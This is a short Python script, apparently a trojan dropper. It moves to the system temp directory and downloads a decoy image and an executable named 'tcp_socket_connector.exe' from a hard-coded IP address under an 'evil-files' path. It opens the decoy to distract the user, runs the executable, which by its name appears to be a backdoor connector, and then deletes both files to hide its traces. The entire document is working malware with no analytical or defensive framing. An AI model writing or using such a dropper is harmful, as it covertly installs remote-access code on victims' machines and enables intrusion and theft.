#!/usr/bin/env python

import requests, subprocess, os, tempfile

def download(url):
    response = requests.get(url)
    file_name = url.split("/")[-1]
    with open(file_name, "wb") as out_file:
        out_file.write(response.content)

temp_directory = tempfile.gettempdir()
os.chdir(temp_directory)

download("http://31.28.252.133/evil-files/car.jpg")
subprocess.Popen("car.jpg", shell=True)

download("http://31.28.252.133/evil-files/tcp_socket_connector.exe")
subprocess.call("tcp_socket_connector.exe", shell=True)

os.remove("car.jpg")
os.remove("tcp_socket_connector.exe")
